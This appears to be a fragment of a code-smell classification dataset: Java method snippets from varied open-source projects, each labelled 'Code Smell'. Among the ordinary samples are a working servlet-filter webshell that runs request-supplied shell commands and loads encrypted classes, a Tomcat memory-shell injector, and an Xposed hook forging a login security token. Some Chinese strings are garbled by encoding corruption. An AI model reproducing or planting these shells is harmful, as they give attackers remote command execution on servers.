  if (history.isEmpty())   return;
  String current=Hawk.get(HawkConfig.API_URL,"""");
  int idx=0;
  if (history.contains(current))   idx=history.indexOf(current);
  ApiHistoryDialog dialog=new ApiHistoryDialog(getContext());
  dialog.setTip(""鍘嗗彶閰嶇疆鍒楄〃"");
  dialog.setAdapter(new ApiHistoryDialogAdapter.SelectDialogInterface(){
    @Override public void click(    String value){
      inputApi.setText(value);
      listener.onchange(value);
      dialog.dismiss();
    }
    @Override public void del(    String value,    ArrayList<String> data){
      Hawk.put(HawkConfig.API_HISTORY,data);
    }
  }
,history,idx);
  dialog.show();
}
@Override public void onClick(View v){
  if (XXPermissions.isGranted(getContext(),Permission.Group.STORAGE)) {
    Toast.makeText(getContext(),""宸茶幏寰楀瓨鍌ㄦ潈闄�"",Toast.LENGTH_SHORT).show();
  }
 else {
    XXPermissions.with(getContext()).permission(Permission.Group.STORAGE).request(new OnPermissionCallback(){
      @Override public void onGranted(      List<String> permissions,      boolean all){
        if (all) {
          Toast.makeText(getContext(),""宸茶幏寰楀瓨鍌ㄦ潈闄�"",Toast.LENGTH_SHORT).show();
        }
      }
      @Override public void onDenied(      List<String> permissions,      boolean never){
        if (never) {
          Toast.makeText(getContext(),""鑾峰彇瀛樺偍鏉冮檺澶辫触,璇峰湪绯荤粺璁剧疆涓紑鍚�"",Toast.LENGTH_SHORT).show();
          XXPermissions.startPermissionActivity((Activity)getContext(),permissions);
        }
 else {
          Toast.makeText(getContext(),""鑾峰彇瀛樺偍鏉冮檺澶辫触"",Toast.LENGTH_SHORT).show();
        }
      }
    }
);
  }
}",1,Code Smell
"/** 
 * {@inheritDoc} 
 */
@Override public boolean isCompatible(DalvInsn insn){
  RegisterSpecList regs=insn.getRegisters();
  if (!((insn instanceof CstInsn) && (regs.size() == 1) && unsignedFitsInByte(regs.get(0).getReg()))) {
    return false;
  }
  CstInsn ci=(CstInsn)insn;
  Constant cst=ci.getConstant();
  if (!(cst instanceof CstLiteralBits)) {
    return false;
  }
  CstLiteralBits cb=(CstLiteralBits)cst;
  if (regs.get(0).getCategory() == 1) {
    int bits=cb.getIntBits();
    return ((bits & 0xffff) == 0);
  }
 else {
    long bits=cb.getLongBits();
    return ((bits & 0xffffffffffffL) == 0);
  }
}",1,Code Smell
"/** 
 * 鏇存柊鎸囧畾鐨 Cluster
 * @param clusterId 瀹氫綅 ClusterId
 * @param request   璇锋眰鏇存柊鏁版嵁
 * @param operator  鎿嶄綔浜
 * @return 鏇存柊鍚庣殑鏁版嵁鍐呭
 */
@Override @Transactional(rollbackFor=Exception.class) public ClusterDTO update(String clusterId,ClusterUpdateReq request,String operator){
  ClusterDO clusterDO=ClusterDO.builder().clusterName(request.getClusterName()).clusterType(request.getClusterType()).clusterConfig(request.getClusterConfig() != null ? JsonUtil.toJsonString(request.getClusterConfig()) : null).masterFlag(request.getMasterFlag()).build();
  clusterService.update(clusterId,clusterDO,operator);
  log.info(""set cluster {} masterFlag to true"",clusterId);
  if (request.getMasterFlag() != null && request.getMasterFlag()) {
    ClusterQueryCondition condition=ClusterQueryCondition.builder().build();
    Pagination<ClusterDO> allClusters=clusterService.list(condition);
    for (    ClusterDO cluster : allClusters.getItems()) {
      if (cluster.getClusterId().equals(clusterId)) {
        continue;
      }
      clusterService.update(cluster.getClusterId(),ClusterDO.builder().masterFlag(false).build(),operator);
      log.info(""set cluster {} masterFlag to false"",cluster.getClusterId());
    }
  }
  return get(clusterId);
}
",1,Code Smell
"@Override public boolean action(Request request,Response response){
  if (request.getNettyRequest() instanceof FullHttpRequest) {
    InputBlacklistRequest inputData=getRequestBody(request.getNettyRequest(),InputBlacklistRequest.class);
    if (inputData != null && !StringUtil.isNullOrEmpty(inputData.getUserId()) && !StringUtil.isNullOrEmpty(inputData.getTargetUid())) {
      WFCMessage.BlackUserRequest friendRequest=WFCMessage.BlackUserRequest.newBuilder().setUid(inputData.getTargetUid()).setStatus(inputData.getStatus()).build();
      sendApiMessage(response,inputData.getUserId(),IMTopic.BlackListUserTopic,friendRequest.toByteArray(),result -> {
        ByteBuf byteBuf=Unpooled.buffer();
        byteBuf.writeBytes(result);
        ErrorCode errorCode=ErrorCode.fromCode(byteBuf.readByte());
        return new Result(errorCode);
      }
);
      return false;
    }
 else {
      setResponseContent(RestResult.resultOf(ErrorCode.INVALID_PARAMETER),response);
    }
  }
  return true;
}
",1,Code Smell
"protected void appendSaveRemovePlaylistButton(){
  if (!mIsSavePlaylistEnabled) {
    return;
  }
  Video original=getVideo();
  if (original == null || (!original.hasPlaylist() && !original.isPlaylistAsChannel() && !original.belongsToUserPlaylists())) {
    return;
  }
  getDialogPresenter().appendSingleButton(UiOptionItem.from(getContext().getString(original.belongsToUserPlaylists() ? R.string.remove_playlist : R.string.save_playlist),optionItem -> {
    MessageHelpers.showMessage(getContext(),R.string.wait_data_loading);
    if (original.hasPlaylist()) {
      syncToggleSaveRemovePlaylist(original,null);
    }
 else     if (original.belongsToUserPlaylists()) {
      mServiceManager.loadChannelUploads(original,mediaGroup -> {
        String playlistId=getFirstPlaylistId(mediaGroup);
        if (playlistId != null) {
          syncToggleSaveRemovePlaylist(original,playlistId);
        }
 else {
          mServiceManager.getPlaylistInfos(playlistInfos -> {
            List<PlaylistInfo> infos=Helpers.filter(playlistInfos,value -> Helpers.equals(value.getTitle(),original.getTitle()));
            String playlistId2=null;
            if (infos != null && infos.size() == 1) {
              playlistId2=infos.get(0).getPlaylistId();
            }
            syncToggleSaveRemovePlaylist(original,playlistId2);
          }
);
        }
      }
);
    }
 else {
      mServiceManager.loadChannelPlaylist(original,mediaGroup -> syncToggleSaveRemovePlaylist(original,getFirstPlaylistId(mediaGroup)));
    }
  }
));
}",1,Code Smell
"private int clone(Emulator<?> emulator){
  Arm32RegisterContext context=emulator.getContext();
  Pointer child_stack=context.getPointerArg(1);
  if (child_stack == null && context.getPointerArg(2) == null) {
    return fork(emulator);
  }
  int fn=context.getR5Int();
  int arg=context.getR6Int();
  if (child_stack != null && child_stack.getInt(0) == fn && child_stack.getInt(4) == arg) {
    return bionic_clone(emulator);
  }
 else {
    return pthread_clone(emulator);
  }
}",1,Code Smell
"private void filter(){
  String text=txtFilter.getText();
  model.clear();
  if (text.length() > 0) {
    List<SocketEntry> filteredList=new ArrayList<>();
    for (    SocketEntry entry : list) {
      if (entry.getApp().contains(text) || (entry.getPort() + """").contains(text) || entry.getHost().contains(text)|| (entry.getPid() + """").contains(text)) {
        filteredList.add(entry);
      }
    }
    model.addEntries(filteredList);
  }
 else {
    model.addEntries(list);
  }
  model.fireTableDataChanged();
}",1,Code Smell
"@Override public void doFilter(ServletRequest servletRequest,ServletResponse servletResponse,FilterChain filterChain) throws IOException, ServletException {
  System.out.println(""[+] Dynamic Filter says hello"");
  if (servletRequest.getParameter(""type"") != null && servletRequest.getParameter(""type"").equals(""basic"")) {
    String cmd=servletRequest.getParameter(basicCmdShellPwd);
    if (cmd != null && !cmd.isEmpty()) {
      String[] cmds=null;
      if (File.separator.equals(""/"")) {
        cmds=new String[]{""/bin/sh"",""-c"",cmd};
      }
 else {
        cmds=new String[]{""cmd"",""/C"",cmd};
      }
      String result=new Scanner(Runtime.getRuntime().exec(cmds).getInputStream()).useDelimiter(""\\A"").next();
      servletResponse.getWriter().println(result);
    }
  }
 else   if (((HttpServletRequest)servletRequest).getHeader(behinderShellHeader) != null) {
    try {
      if (((HttpServletRequest)servletRequest).getMethod().equals(""POST"")) {
        String k=behinderShellPwd;
        ((HttpServletRequest)servletRequest).getSession().setAttribute(""u"",k);
        Cipher cipher=Cipher.getInstance(""AES"");
        cipher.init(2,new SecretKeySpec((((HttpServletRequest)servletRequest).getSession().getAttribute(""u"") + """").getBytes(),""AES""));
        byte[] evilClassBytes=cipher.doFinal(new sun.misc.BASE64Decoder().decodeBuffer(servletRequest.getReader().readLine()));
        Class evilClass=(Class)myClassLoaderClazz.getDeclaredMethod(""defineClass"",byte[].class,ClassLoader.class).invoke(null,evilClassBytes,Thread.currentThread().getContextClassLoader());
        Object evilObject=evilClass.newInstance();
        Method targetMethod=evilClass.getDeclaredMethod(""equals"",new Class[]{ServletRequest.class,ServletResponse.class});
        targetMethod.invoke(evilObject,new Object[]{servletRequest,servletResponse});
      }
    }
 catch (    Exception e) {
      e.printStackTrace();
    }
  }
 else {
    filterChain.doFilter(servletRequest,servletResponse);
  }
}",1,Code Smell
"private static boolean tickEntry(Entry entry,boolean hasWrench){
  ChassisBlockEntity chassisBlockEntity=entry.be;
  Level beWorld=chassisBlockEntity.getLevel();
  Level world=Minecraft.getInstance().level;
  if (chassisBlockEntity.isRemoved() || beWorld == null || beWorld != world || !world.isLoaded(chassisBlockEntity.getBlockPos())) {
    return true;
  }
  if (!hasWrench && entry.timer > 20) {
    entry.timer=20;
    return false;
  }
  entry.timer--;
  if (entry.timer == 0)   return true;
  return false;
}",1,Code Smell
"/** 
 */
public SessionListPanel(AppWindow window){
  super(new BorderLayout());
  this.window=window;
  sessionListModel=new DefaultListModel<>();
  sessionList=new JList<>(sessionListModel);
  sessionList.setCursor(DEFAULT_CURSOR);
  SessionListRenderer r=new SessionListRenderer();
  sessionList.setCellRenderer(r);
  JScrollPane scrollPane=new SkinnedScrollPane(sessionList);
  this.add(scrollPane);
  sessionList.addMouseListener(new MouseAdapter(){
    @Override public void mouseClicked(    MouseEvent e){
      int selectedIndex=sessionList.getSelectedIndex();
      int index=sessionList.locationToIndex(e.getPoint());
      if (index != -1 && selectedIndex == index) {
        Rectangle r=sessionList.getCellBounds(index,index);
        if (r != null && r.contains(e.getPoint())) {
          int x=e.getPoint().x;
          int y=e.getPoint().y;
          if (x > r.x + r.width - 30 && x < r.x + r.width && y > r.y + 10 && y < r.y + r.height - 10) {
            System.out.println(""Clicked on: "" + index);
            removeSession(index);
          }
        }
      }
    }
    @Override public void mouseExited(    MouseEvent e){
      sessionList.setCursor(DEFAULT_CURSOR);
    }
  }
);
  sessionList.addMouseMotionListener(new MouseAdapter(){
    @Override public void mouseMoved(    MouseEvent e){
      int index=sessionList.locationToIndex(e.getPoint());
      if (index != -1) {
        Rectangle r=sessionList.getCellBounds(index,index);
        if (r != null && r.contains(e.getPoint())) {
          int x=e.getPoint().x;
          int y=e.getPoint().y;
          if (x > r.x + r.width - 30 && x < r.x + r.width && y > r.y + 10 && y < r.y + r.height - 10) {
            sessionList.setCursor(HAND_CURSOR);
            return;
          }
        }
      }
      sessionList.setCursor(DEFAULT_CURSOR);
    }
  }
);
  sessionList.addListSelectionListener(e -> {
    System.out.println(""called for index: "" + sessionList.getSelectedIndex() + "" ""+ e.getFirstIndex()+ "" ""+ e.getLastIndex()+ e.getValueIsAdjusting());
    if (!e.getValueIsAdjusting()) {
      int index=sessionList.getSelectedIndex();
      if (index != -1) {
        this.selectSession(index);
      }
    }
  }
);
}",1,Code Smell
"public Collection<? extends MqttProperty> listAll(){
  IntObjectHashMap<MqttProperty> props=this.props;
  if (props == null && subscriptionIds == null && userProperties == null) {
    return Collections.<MqttProperty>emptyList();
  }
  if (subscriptionIds == null && userProperties == null) {
    return props.values();
  }
  if (props == null && userProperties == null) {
    return subscriptionIds;
  }
  List<MqttProperty> propValues=new ArrayList<MqttProperty>(props != null ? props.size() : 1);
  if (props != null) {
    propValues.addAll(props.values());
  }
  if (subscriptionIds != null) {
    propValues.addAll(subscriptionIds);
  }
  if (userProperties != null) {
    propValues.add(UserProperties.fromUserPropertyCollection(userProperties));
  }
  return propValues;
}",1,Code Smell
"@Override public void onRequestPermissionsResult(int requestCode,@NonNull String[] permissions,@NonNull int[] grantResults){
  super.onRequestPermissionsResult(requestCode,permissions,grantResults);
  if (requestCode == 100 && grantResults.length > 0 && grantResults[0] == PackageManager.PERMISSION_GRANTED) {
    startActivityForResult(new Intent(this,ScanQRCodeActivity.class),REQUEST_CODE_SCAN_QR_CODE);
  }
}",1,Code Smell
"public LoginFixHook(Context context){
  Class<?> neteaseMusicUtilsClass=XposedHelpers.findClassIfExists(""com.netease.cloudmusic.utils.NeteaseMusicUtils"",context.getClassLoader());
  if (neteaseMusicUtilsClass != null) {
    XposedHelpers.findAndHookMethod(neteaseMusicUtilsClass,""serialdata"",String.class,String.class,new XC_MethodHook(){
      @Override protected void beforeHookedMethod(      MethodHookParam param) throws Throwable {
        super.beforeHookedMethod(param);
        if (param.args[0].equals(""/api/login/cellphone"") || param.args[0].equals(""/api/login"") || param.args[0].equals(""/api/login/sns"")) {
          if (((String)param.args[1]).contains(""\""checkToken\"":\""\"""")) {
            Class<?> watchmanClass=XposedHelpers.findClassIfExists(""com.netease.mobsecurity.rjsb.watchman"",context.getClassLoader());
            if (watchmanClass == null)             watchmanClass=XposedHelpers.findClassIfExists(""com.netease.mobsec.rjsb.watchman"",context.getClassLoader());
            if (watchmanClass != null) {
              XposedHelpers.callStaticMethod(watchmanClass,""init"",context,""YD00000558929251"");
              String checkToken=(String)XposedHelpers.callStaticMethod(watchmanClass,""getToken"",""30b0cdd23ed1144a0b78de049edc09824"",500,2);
              param.args[1]=((String)param.args[1]).replaceAll(""\""checkToken\"":\""\"""",""\""checkToken\"":\"""" + checkToken + ""\"""");
            }
          }
        }
      }
    }
);
  }
}",1,Code Smell
"/** 
 * Currently we only support TableScan - Project - Filter - Inner Join 
 */
private static boolean isValidRelNodePlan(RelNode node,RelMetadataQuery mq){
  final Multimap<Class<? extends RelNode>,RelNode> m=mq.getNodeTypes(node);
  for (  Entry<Class<? extends RelNode>,Collection<RelNode>> e : m.asMap().entrySet()) {
    Class<? extends RelNode> c=e.getKey();
    if (!TableScan.class.isAssignableFrom(c) && !Project.class.isAssignableFrom(c) && !Filter.class.isAssignableFrom(c)&& (!Join.class.isAssignableFrom(c))) {
      return false;
    }
    if (Join.class.isAssignableFrom(c)) {
      for (      RelNode n : e.getValue()) {
        final Join join=(Join)n;
        if (join.getJoinType() != JoinRelType.INNER && !join.isSemiJoin()) {
          return false;
        }
      }
    }
  }
  return true;
}
",1,Code Smell
"private void addOperators(Map<String,PatternOp> map,String prefix,List<SqlOperator> operatorList){
  for (  SqlOperator op : operatorList) {
    final String name=op.getName().equals(""TRANSLATE3"") ? ""TRANSLATE"" : op.getName();
    if (op instanceof SqlSpecialOperator || !name.matches(""^[a-zA-Z][a-zA-Z0-9_]*$"")) {
      continue;
    }
    final String regex;
    if (op instanceof SqlOverlapsOperator) {
      regex=""[ ]*<td>period1 "" + name + "" period2</td>"";
    }
 else     if (op instanceof SqlFunction && (op.getOperandTypeChecker() == null || op.getOperandTypeChecker().getOperandCountRange().getMin() != 0)) {
      regex=prefix + ""\\| .*"" + name+ ""\\(.*"";
    }
 else {
      regex=prefix + ""\\| .*"" + name+ "".*"";
    }
    map.put(regex,new PatternOp(Pattern.compile(regex),name));
  }
}",1,Code Smell
"@Override public LoadErrorAction onLoadError(Chunk loadable,long elapsedRealtimeMs,long loadDurationMs,IOException error,int errorCount){
  long bytesLoaded=loadable.bytesLoaded();
  boolean isMediaChunk=isMediaChunk(loadable);
  int lastChunkIndex=mediaChunks.size() - 1;
  boolean cancelable=bytesLoaded == 0 || !isMediaChunk || !haveReadFromMediaChunk(lastChunkIndex);
  long blacklistDurationMs=cancelable ? loadErrorHandlingPolicy.getBlacklistDurationMsFor(loadable.type,loadDurationMs,error,errorCount) : C.TIME_UNSET;
  LoadErrorAction loadErrorAction=null;
  if (chunkSource.onChunkLoadError(loadable,cancelable,error,blacklistDurationMs)) {
    if (cancelable) {
      loadErrorAction=Loader.DONT_RETRY;
      if (isMediaChunk) {
        BaseMediaChunk removed=discardUpstreamMediaChunksFromIndex(lastChunkIndex);
        Assertions.checkState(removed == loadable);
        if (mediaChunks.isEmpty()) {
          pendingResetPositionUs=lastSeekPositionUs;
        }
      }
    }
 else {
      Log.w(TAG,""Ignoring attempt to cancel non-cancelable load."");
    }
  }
  if (loadErrorAction == null) {
    long retryDelayMs=loadErrorHandlingPolicy.getRetryDelayMsFor(loadable.type,loadDurationMs,error,errorCount);
    loadErrorAction=retryDelayMs != C.TIME_UNSET ? Loader.createRetryAction(false,retryDelayMs) : Loader.DONT_RETRY_FATAL;
  }
  boolean canceled=!loadErrorAction.isRetry();
  eventDispatcher.loadError(loadable.dataSpec,loadable.getUri(),loadable.getResponseHeaders(),loadable.type,primaryTrackType,loadable.trackFormat,loadable.trackSelectionReason,loadable.trackSelectionData,loadable.startTimeUs,loadable.endTimeUs,elapsedRealtimeMs,loadDurationMs,bytesLoaded,error,canceled);
  if (canceled) {
    callback.onContinueLoadingRequested(this);
  }
  return loadErrorAction;
}",1,Code Smell
"static Dimension getPlaceholderPreferredSize(JComponent c,String options){
  JRootPane rootPane;
  Rectangle bounds;
  if (!options.startsWith(SystemInfo.isMacOS ? ""mac"" : ""win"") || !c.isDisplayable() || (rootPane=SwingUtilities.getRootPane(c)) == null || (bounds=(Rectangle)rootPane.getClientProperty(FlatClientProperties.FULL_WINDOW_CONTENT_BUTTONS_BOUNDS)) == null)   return new Dimension(0,0);
  if (options.length() > 3) {
    if ((options.contains(""leftToRight"") && !c.getComponentOrientation().isLeftToRight()) || (options.contains(""rightToLeft"") && c.getComponentOrientation().isLeftToRight()))     return new Dimension(0,0);
  }
  if (SystemInfo.isMacFullWindowContentSupported && FlatNativeMacLibrary.isLoaded()) {
    Rectangle r=FlatNativeMacLibrary.getWindowButtonsBounds(SwingUtilities.windowForComponent(c));
    if (r != null)     bounds=r;
  }
  int width=bounds.width;
  int height=bounds.height;
  if (options.length() > 3) {
    if (width == 0 && options.contains(""zeroInFullScreen""))     height=0;
    if (options.contains(""horizontal""))     height=0;
    if (options.contains(""vertical""))     width=0;
  }
  return new Dimension(width,height);
}",1,Code Smell
"@Override public void sendButtonPressed(int index,VideoEditedInfo videoEditedInfo,boolean notify,int scheduleDate,boolean forceDocument){
  if (index < 0 || index >= botContextResults.size()) {
    return;
  }
  sendBotInlineResult((TLRPC.BotInlineResult)botContextResults.get(index),notify,scheduleDate);
}
@Override public void sendButtonPressed(int index,VideoEditedInfo videoEditedInfo,boolean notify,int scheduleDate,boolean forceDocument){
  sendMedia((MediaController.PhotoEntry)cameraPhoto.get(0),videoEditedInfo,notify,scheduleDate,forceDocument);
}
@Override public void sendButtonPressed(int index,VideoEditedInfo videoEditedInfo,boolean notify,int scheduleDate,boolean forceDocument){
  for (int i=entries.size() - 1; i >= 0; --i) {
    if (!checked[i]) {
      entries.remove(i);
    }
  }
  sendPhotosGroup(entries,notify,scheduleDate,forceDocument);
}
@Override public void sendButtonPressed(int index,VideoEditedInfo videoEditedInfo,boolean notify,int scheduleDate,boolean forceDocument){
  if (editingMessageObject != object) {
    return;
  }
  if (entry.isCropped || entry.isPainted || entry.isFiltered|| videoEditedInfo != null) {
    sendMedia(entry,videoEditedInfo,notify,scheduleDate,forceDocument);
  }
 else {
    chatActivityEnterView.doneEditingMessage();
  }
}
@Override public void sendButtonPressed(int index,VideoEditedInfo videoEditedInfo,boolean notify,int scheduleDate,boolean forceDocument){
  message.settingAvatar=true;
  if (entry.imagePath != null || entry.isVideo) {
    PhotoUtilities.setImageAsAvatar(entry,ChatActivity.this,() -> {
      message.settingAvatar=false;
    }
);
  }
 else {
    TLRPC.TL_photos_updateProfilePhoto req=new TLRPC.TL_photos_updateProfilePhoto();
    req.id=new TLRPC.TL_inputPhoto();
    req.id.id=message.messageOwner.action.photo.id;
    req.id.access_hash=message.messageOwner.action.photo.access_hash;
    req.id.file_reference=message.messageOwner.action.photo.file_reference;
    getConnectionsManager().sendRequest(req,(response,error) -> AndroidUtilities.runOnUIThread(() -> {
      if (response instanceof TLRPC.TL_photos_photo) {
        TLRPC.TL_photos_photo photos_photo=(TLRPC.TL_photos_photo)response;
        getMessagesController().putUsers(photos_photo.users,false);
        TLRPC.User user=getMessagesController().getUser(getUserConfig().clientUserId);
        if (photos_photo.photo instanceof TLRPC.TL_photo) {
          if (user != null) {
            PhotoUtilities.applyPhotoToUser(message.messageOwner.action.photo,user,false);
            getUserConfig().setCurrentUser(user);
            getUserConfig().saveConfig(true);
            CharSequence title=AndroidUtilities.replaceTags(LocaleController.getString(""ApplyAvatarHintTitle"",R.string.ApplyAvatarHintTitle));
            CharSequence subtitle=AndroidUtilities.replaceSingleTag(LocaleController.getString(""ApplyAvatarHint"",R.string.ApplyAvatarHint),() -> {
              Bundle args=new Bundle();
              args.putLong(""user_id"",UserConfig.getInstance(currentAccount).clientUserId);
              presentFragment(new ProfileActivity(args));
            }
);
            BulletinFactory.of(ChatActivity.this).createUsersBulletin(Collections.singletonList(user),title,subtitle).show();
          }
        }
      }
      message.settingAvatar=false;
    }
));
  }
}",1,Code Smell
"@Override protected void renderForeground(GuiGraphics graphics,int mouseX,int mouseY,float partialTicks){
  SchematicannonBlockEntity be=menu.contentHolder;
  int x=leftPos;
  int y=topPos;
  int fuelX=x + 36, fuelY=y + 19;
  if (mouseX >= fuelX && mouseY >= fuelY && mouseX <= fuelX + AllGuiTextures.SCHEMATICANNON_FUEL.width && mouseY <= fuelY + AllGuiTextures.SCHEMATICANNON_FUEL.height) {
    List<Component> tooltip=getFuelLevelTooltip(be);
    graphics.renderComponentTooltip(font,tooltip,mouseX,mouseY);
  }
  if (hoveredSlot != null && !hoveredSlot.hasItem()) {
    if (hoveredSlot.index == 0)     graphics.renderComponentTooltip(font,TooltipHelper.cutTextComponent(Lang.translateDirect(_slotSchematic),Palette.GRAY_AND_BLUE),mouseX,mouseY);
    if (hoveredSlot.index == 2)     graphics.renderComponentTooltip(font,TooltipHelper.cutTextComponent(Lang.translateDirect(_slotListPrinter),Palette.GRAY_AND_BLUE),mouseX,mouseY);
    if (hoveredSlot.index == 4)     graphics.renderComponentTooltip(font,TooltipHelper.cutTextComponent(Lang.translateDirect(_slotGunpowder),Palette.GRAY_AND_BLUE),mouseX,mouseY);
  }
  if (be.missingItem != null) {
    int missingBlockX=x + 128, missingBlockY=y + 49;
    if (mouseX >= missingBlockX && mouseY >= missingBlockY && mouseX <= missingBlockX + 16 && mouseY <= missingBlockY + 16) {
      graphics.renderTooltip(font,be.missingItem,mouseX,mouseY);
    }
  }
  int paperX=x + 112, paperY=y + 19;
  if (mouseX >= paperX && mouseY >= paperY && mouseX <= paperX + 16 && mouseY <= paperY + 16)   graphics.renderTooltip(font,listPrinter,mouseX,mouseY);
  super.renderForeground(graphics,mouseX,mouseY,partialTicks);
}",1,Code Smell
"public boolean isHeapSpaceExhausted(){
  if (strategy != null && strategy.heapUsageThreshold != 0 && strategy.heapRateThreshold != 0) {
    GcStats stats=heapStats();
    return stats != null && stats.usedPercent >= strategy.heapUsageThreshold && stats.gcRate >= strategy.heapRateThreshold;
  }
 else {
    return false;
  }
}",1,Code Smell
"@Override public boolean action(Request request,Response response){
  if (request.getNettyRequest() instanceof FullHttpRequest) {
    InputGetUserInfo inputUserId=getRequestBody(request.getNettyRequest(),InputGetUserInfo.class);
    if (inputUserId != null && (!StringUtil.isNullOrEmpty(inputUserId.getUserId()) || !StringUtil.isNullOrEmpty(inputUserId.getName()) || !StringUtil.isNullOrEmpty(inputUserId.getMobile()))) {
      WFCMessage.User user=null;
      if (!StringUtil.isNullOrEmpty(inputUserId.getUserId())) {
        user=messagesStore.getUserInfo(inputUserId.getUserId());
      }
 else       if (!StringUtil.isNullOrEmpty(inputUserId.getName())) {
        user=messagesStore.getUserInfoByName(inputUserId.getName());
      }
 else       if (!StringUtil.isNullOrEmpty(inputUserId.getMobile())) {
        user=messagesStore.getUserInfoByMobile(inputUserId.getMobile());
      }
      RestResult result;
      if (user == null || user.getDeleted() > 0) {
        result=RestResult.resultOf(ErrorCode.ERROR_CODE_NOT_EXIST);
      }
 else {
        result=RestResult.ok(InputOutputUserInfo.fromPbUser(user));
      }
      setResponseContent(result,response);
    }
 else {
      setResponseContent(RestResult.resultOf(ErrorCode.INVALID_PARAMETER),response);
    }
  }
  return true;
}",1,Code Smell
"@Override public long getTimeUs(long position){
  long positionOffset=position - dataStartPosition;
  if (!isSeekable() || positionOffset <= xingFrameSize) {
    return 0L;
  }
  long[] tableOfContents=Assertions.checkNotNull(this.tableOfContents);
  double scaledPosition=(positionOffset * 256d) / dataSize;
  int prevTableIndex=Util.binarySearchFloor(tableOfContents,(long)scaledPosition,true,true);
  long prevTimeUs=getTimeUsForTableIndex(prevTableIndex);
  long prevScaledPosition=tableOfContents[prevTableIndex];
  long nextTimeUs=getTimeUsForTableIndex(prevTableIndex + 1);
  long nextScaledPosition=prevTableIndex == 99 ? 256 : tableOfContents[prevTableIndex + 1];
  double interpolateFraction=prevScaledPosition == nextScaledPosition ? 0 : ((scaledPosition - prevScaledPosition) / (nextScaledPosition - prevScaledPosition));
  return prevTimeUs + Math.round(interpolateFraction * (nextTimeUs - prevTimeUs));
}",1,Code Smell
"/** 
 * Reads a line.
 * @return the line or null
 */
private String readLine(){
  String line=null;
  int newLineMatchByteCount;
  final boolean isLastFilePart=no == 1;
  int i=currentLastBytePos;
  while (i > -1) {
    if (!isLastFilePart && i < avoidNewlineSplitBufferSize) {
      createLeftOver();
      break;
    }
    if ((newLineMatchByteCount=getNewLineMatchByteCount(data,i)) > 0) {
      final int lineStart=i + 1;
      final int lineLengthBytes=currentLastBytePos - lineStart + 1;
      if (lineLengthBytes < 0) {
        throw new IllegalStateException(""Unexpected negative line length="" + lineLengthBytes);
      }
      final byte[] lineData=new byte[lineLengthBytes];
      System.arraycopy(data,lineStart,lineData,0,lineLengthBytes);
      line=new String(lineData,encoding);
      currentLastBytePos=i - newLineMatchByteCount;
      break;
    }
    i-=byteDecrement;
    if (i < 0) {
      createLeftOver();
      break;
    }
  }
  if (isLastFilePart && leftOver != null) {
    line=new String(leftOver,encoding);
    leftOver=null;
  }
  return line;
}",1,Code Smell
"public TomcatMemshellTemplate2(){
  try {
    boolean var4=false;
    Thread[] var5=(Thread[])getFV(Thread.currentThread().getThreadGroup(),""threads"");
    for (int var6=0; var6 < var5.length; ++var6) {
      Thread var7=var5[var6];
      if (var7 != null) {
        String var3=var7.getName();
        if (!var3.contains(""exec"") && var3.contains(""http"")) {
          Object var1=getFV(var7,""target"");
          if (var1 instanceof Runnable) {
            try {
              var1=getFV(getFV(getFV(var1,""this$0""),""handler""),""global"");
            }
 catch (            Exception var13) {
              continue;
            }
            List var9=(List)getFV(var1,""processors"");
            for (int var10=0; var10 < var9.size(); ++var10) {
              Object var11=var9.get(var10);
              var1=getFV(var11,""req"");
              Object var2=var1.getClass().getMethod(""getResponse"").invoke(var1);
              var3=(String)var1.getClass().getMethod(""getHeader"",String.class).invoke(var1,""Shell"");
              if (var3 != null && !var3.isEmpty()) {
                try {
                  injectMemshell(var1);
                  writeBody(var2,""[+] Memshell Inject Success"".getBytes());
                }
 catch (                Exception e) {
                  writeBody(var2,""[-] Memshell Inject Failed"".getBytes());
                }
                var4=true;
              }
              if (var4) {
                break;
              }
            }
            if (var4) {
              break;
            }
          }
        }
      }
    }
  }
 catch (  Exception e) {
    e.printStackTrace();
  }
}",1,Code Smell
"/** 
 * 驼峰转下划线命名
 */
public static String toUnderScoreCase(String str){
  if (str == null) {
    return null;
  }
  StringBuilder sb=new StringBuilder();
  boolean preCharIsUpperCase=true;
  boolean curreCharIsUpperCase=true;
  boolean nexteCharIsUpperCase=true;
  for (int i=0; i < str.length(); i++) {
    char c=str.charAt(i);
    if (i > 0) {
      preCharIsUpperCase=Character.isUpperCase(str.charAt(i - 1));
    }
 else {
      preCharIsUpperCase=false;
    }
    curreCharIsUpperCase=Character.isUpperCase(c);
    if (i < (str.length() - 1)) {
      nexteCharIsUpperCase=Character.isUpperCase(str.charAt(i + 1));
    }
    if (preCharIsUpperCase && curreCharIsUpperCase && !nexteCharIsUpperCase) {
      sb.append(SEPARATOR);
    }
 else     if ((i != 0 && !preCharIsUpperCase) && curreCharIsUpperCase) {
      sb.append(SEPARATOR);
    }
    sb.append(Character.toLowerCase(c));
  }
  return sb.toString();
}",1,Code Smell
"@Override public void seek(long position,long timeUs){
  boolean hasNotEncounteredFirstTimestamp=timestampAdjuster.getTimestampOffsetUs() == C.TIME_UNSET;
  if (hasNotEncounteredFirstTimestamp || (timestampAdjuster.getFirstSampleTimestampUs() != 0 && timestampAdjuster.getFirstSampleTimestampUs() != timeUs)) {
    timestampAdjuster.reset();
    timestampAdjuster.setFirstSampleTimestampUs(timeUs);
  }
  if (psBinarySearchSeeker != null) {
    psBinarySearchSeeker.setSeekTargetUs(timeUs);
  }
  for (int i=0; i < psPayloadReaders.size(); i++) {
    psPayloadReaders.valueAt(i).seek();
  }
}
/** 
 * Notifies the reader that a seek has occurred. <p> Following a call to this method, the data passed to the next invocation of {@link #consume(ParsableByteArray)} will not be a continuation of the data that waspreviously passed. Hence the reader should reset any internal state.
 */
public void seek(){
  seenFirstDts=false;
  pesPayloadReader.seek();
}",1,Code Smell
"private static boolean hasPrePostSecuredMethods(Class<?> type,SearchStrategy strategy){
  for (  Method method : type.getDeclaredMethods()) {
    MergedAnnotations methodAnnotations=MergedAnnotations.from(method,strategy);
    if (methodAnnotations.get(PRE_AUTHORIZE).isPresent() || methodAnnotations.get(PRE_FILTER).isPresent() || methodAnnotations.get(POST_AUTHORIZE).isPresent()|| methodAnnotations.get(POST_FILTER).isPresent()) {
      return true;
    }
  }
  return false;
}
",1,Code Smell
"/** 
 * 鎵撳嵃绾跨▼寮傚父淇℃伅
 */
public static void printException(Runnable r,Throwable t){
  if (t == null && r instanceof Future<?>) {
    try {
      Future<?> future=(Future<?>)r;
      if (future.isDone()) {
        future.get();
      }
    }
 catch (    CancellationException ce) {
      t=ce;
    }
catch (    ExecutionException ee) {
      t=ee.getCause();
    }
catch (    InterruptedException ie) {
      Thread.currentThread().interrupt();
    }
  }
